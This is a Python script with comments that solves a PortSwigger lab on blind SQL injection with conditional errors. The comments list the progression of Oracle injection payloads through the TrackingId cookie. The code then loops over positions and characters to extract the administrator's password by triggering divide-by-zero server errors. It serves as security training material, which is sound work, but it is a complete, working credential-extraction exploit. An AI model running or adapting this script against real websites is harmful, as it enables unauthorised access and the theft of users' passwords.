# This is a simple Python program created to solve the following lab:
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

# The following series of SQL injections were used in the process of creating of the final payload:

# TrackingId=xyz'
# Tracking ID is replaced, single quote is used to return server error.

# TrackingId=xyz' OR 1 = 1 --
# Rest of query is commented out creating valid query syntax, no server error.

# TrackingId=xyz' OR 1 = (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
# Oracle SQL syntax used to create conditional that tries to divide by zero if 1 = 1, returns server error.

# TrackingId=xyz' OR 1 = (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
# Same query as above, except this conditional triggers a falsy value causing the overall expression to evaluate to 1, returns nothing.

# TrackingId=xyz' OR 1 = (SELECT CASE WHEN (SUBSTR((SELECT password FROM USERS where username='administrator'), 0, 1) = 'a') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
# Final payload, server error is triggered with divide by zero in conditional statement when admins password in position 0 is equal to a, otherwise no error returned.

import requests

SCHEME = "HTTPS://"
URL = "web-security-academy.net"
PATH = "/login"
SUB_DOMAIN = "Insert Lab Sub-Domain Here" # Change This Line With Labs Subdomain
FULL_PATH = SCHEME + SUB_DOMAIN + "." + URL + PATH
PASSWORD_LENGTH = 20
MESSAGE = "Internal Server Error"
NUMS_AND_LOW_ALPHA = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
    'a', 'b', 'c', 'd', 'e', 'f', 'g',
    'h', 'i', 'j', 'k', 'l', 'm', 'n',
    'o', 'p', 'q', 'r', 's', 't', 'u',
    'v', 'w', 'x', 'y', 'z'
]

print("Program has started...")
print(f"Targetted URL: {FULL_PATH}")
print(f"Target Message: {MESSAGE}")
print(f"Assumed password length: {PASSWORD_LENGTH}")

password = ""

for i in range(1, PASSWORD_LENGTH + 1):
    for char in NUMS_AND_LOW_ALPHA:
        print(f"Checking Administrators Password... POSITION: {i} -- CHARACTER: {char}")
        blind_conditional_sqli = f"' OR 1 = (SELECT CASE WHEN (SUBSTR((SELECT password FROM USERS where username='administrator'), {i}, 1) = '{char}') THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--"
        headers = {"Cookie" : "TrackingId=xyz" + blind_conditional_sqli}
        response = requests.get(FULL_PATH, headers=headers)
        if MESSAGE in response.text:
            print("Possible Match Found")
            password = f"{password}{char}"
            print(f"Password So Far: {password}")
            break
print(password)
